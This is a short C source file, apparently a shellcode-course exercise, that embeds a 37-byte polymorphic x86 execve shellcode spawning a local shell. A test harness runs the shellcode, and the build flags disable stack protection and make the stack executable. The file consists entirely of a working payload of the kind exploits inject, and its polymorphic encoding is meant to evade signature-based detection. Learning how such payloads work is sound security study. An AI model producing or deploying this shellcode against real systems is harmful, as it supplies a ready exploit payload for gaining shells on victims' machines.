/**
* Filename: execve_poly_shellcode.c
* Author: h3ll0clar1c3
* Purpose: Spawn a shell on the local host   
* Compilation: gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final  
* Usage: ./execve_poly_final
* Shellcode size: 37 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xd2\x52\xb8\xb7\xd8\x3e\x46\x05\x78\x56\x34\x22\x50\xb8\xde\xc0\xad"
"\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80";

int main()
{
        printf("Shellcode length: %d bytes\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
